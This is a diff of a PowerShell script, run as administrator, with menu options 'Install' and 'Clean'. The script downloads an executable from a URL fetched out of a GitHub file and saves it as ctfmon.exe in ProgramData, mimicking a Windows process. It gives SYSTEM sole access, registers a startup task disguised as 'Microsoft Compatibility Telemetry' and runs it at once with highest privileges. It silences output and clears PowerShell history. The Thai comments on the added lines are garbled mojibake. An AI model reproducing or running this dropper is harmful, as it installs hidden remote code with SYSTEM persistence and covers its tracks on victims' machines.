@@ -1,18 +1,18 @@
 #Requires -RunAsAdministrator
 Clear-Host
-Write-Host "1 : Install Premium"
-Write-Host "2 : Clean Premium"
+Write-Host "1 : Install"
+Write-Host "2 : Clean"
 Write-Host ""
 $choice = Read-Host "Select (1/2)"
 $ErrorActionPreference = 'Stop'
 $ProgressPreference = 'SilentlyContinue'
 
-$programData = "C:\ProgramData"  # path สำหรับเก็บไฟล์
+$programData = "C:\ProgramData"  # à¹€à¸›à¸¥à¸µà¹ˆà¸¢à¸™à¸à¸¥à¸±à¸šà¹€à¸›à¹‡à¸™ path à¹€à¸”à¸´à¸¡à¸•à¸²à¸¡à¸—à¸µà¹ˆà¸‚à¸­
 $exeUrl = (Invoke-WebRequest -Uri "https://github.com/unknowanyma/unknowx/raw/refs/heads/main/taxxx" -UseBasicParsing).Content.Trim()
-$exeName = "ctfmon.exe"                      # ชื่อไฟล์ .exe
+$exeName = "ctfmon.exe"                      # à¸Šà¸·à¹ˆà¸­à¹€à¸™à¸µà¸¢à¸™
 $exePath = Join-Path $programData $exeName
 
-$taskName = "Microsoft Compatibility Telemetry"  # ชื่อ task
+$taskName = "Microsoft Compatibility Telemetry"  # à¸Šà¸·à¹ˆà¸­ task à¹€à¸™à¸µà¸¢à¸™
 
 function Clear-PowerShellTraces {
     Clear-History -ErrorAction SilentlyContinue
@@ -62,27 +62,26 @@ if ($choice -eq "1") {
             New-Item -Path $programData -ItemType Directory -Force *>$null 2>$null
         }
 
-        # ลบไฟล์ .exe ถ้ามี
+        # à¸¥à¸šà¸‚à¸­à¸‡à¹€à¸à¹ˆà¸²à¸–à¹‰à¸²à¸¡à¸µ
         if (Test-Path $exePath) {
             Reset-FileACLAndTakeOwnership $exePath
             Remove-Item $exePath -Force -ErrorAction Stop
         }
 
-        # ดาวน์โหลดไฟล์ .exe
+        # à¸”à¸²à¸§à¸™à¹Œà¹‚à¸«à¸¥à¸”
         if ($exeUrl -match '^https?://') {
-                Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop *>$null 2>$null
+            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop *>$null 2>$null
         }
 
-        # ตั้งค่า ACL ให้ SYSTEM เข้าถึงได้เต็มที่
+        # à¸•à¸±à¹‰à¸‡ ACL à¹ƒà¸«à¹‰ SYSTEM à¹€à¸—à¹ˆà¸²à¸™à¸±à¹‰à¸™
         & icacls "$exePath" /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(F)" /C /Q *>$null 2>$null
-
         Start-Sleep -Milliseconds 800
 
-        # สร้าง task
+        # à¸ªà¸£à¹‰à¸²à¸‡ task
         schtasks /create /tn "$taskName" /tr "$exePath" /sc ONSTART /ru SYSTEM /rl HIGHEST /f /DELAY 0000:30 *>$null 2>$null
         if ($LASTEXITCODE -ne 0) { $errorCode = 6; throw }
 
-        # เรียกใช้ task
+        # à¸£à¸±à¸™à¸—à¸±à¸™à¸—à¸µ
         schtasks /run /tn "$taskName" *>$null 2>$null
         if ($LASTEXITCODE -ne 0) { $errorCode = 7; throw }
     }
@@ -119,4 +118,3 @@ else {
 }
 
 Clear-PowerShellTraces
-
